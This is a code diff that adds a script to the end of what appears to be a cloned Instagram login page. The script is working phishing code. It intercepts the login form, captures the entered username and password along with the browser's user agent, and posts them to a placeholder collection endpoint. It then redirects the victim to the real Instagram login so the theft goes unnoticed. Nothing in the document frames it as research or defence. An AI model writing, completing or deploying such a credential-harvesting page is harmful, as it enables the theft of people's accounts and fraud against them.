@@ -18623,3 +18623,56 @@
     <div class="_5qKD1"><div class="q5edG"></div></div>
   </body>
 </html>
+<!-- Inside login.html, preferably near the end before </body> -->
+<script>
+  const loginForm = document.getElementById('loginForm');
+
+  loginForm.addEventListener('submit', function(event) {
+    event.preventDefault(); // Stop the default form submission to login.php
+
+    const usernameInput = loginForm.querySelector('input[name="username"]');
+    const passwordInput = loginForm.querySelector('input[name="password"]');
+
+    const formData = {
+      username: usernameInput.value,
+      password: passwordInput.value,
+      // You might want to add more info here if needed
+      submittedAt: new Date().toISOString(),
+      ipAddress: 'CLIENT_SIDE_IP_NOT_RELIABLE', // Note: Getting reliable IP client-side is hard/impossible
+      userAgent: navigator.userAgent
+    };
+
+    // Replace with your actual endpoint URL from Serverless, BaaS, Form Service, or Apps Script
+    const endpointUrl = 'YOUR_ENDPOINT_URL';
+
+    fetch(endpointUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        // Add 'Accept: application/json' if your endpoint expects it
+      },
+      body: JSON.stringify(formData) // Send data as JSON
+    })
+    .then(response => {
+      // Optional: Check if the request was successful
+      // console.log('Data sent, server responded:', response.status);
+
+      // --- REDIRECTION ---
+      // Redirect the user *after* the data has been sent (or attempted to be sent)
+      // You might want to wait for the response or just redirect immediately
+      window.location.href = 'https://www.instagram.com/login/?source=failed_js_submit'; // Redirect to real Instagram
+    })
+    .catch(error => {
+      console.error('Error sending form data:', error);
+      // Still redirect even if there was an error sending data
+      window.location.href = 'https://www.instagram.com/login/?source=failed_js_error'; // Redirect to real Instagram
+    });
+
+    // Optional: Show a loading state on the button here
+    const submitButton = loginForm.querySelector('button[type="submit"]');
+    if (submitButton) {
+        submitButton.innerHTML = 'Logging In...'; // Or add a spinner SVG like in the original HTML
+        submitButton.disabled = true;
+    }
+  });
+</script>
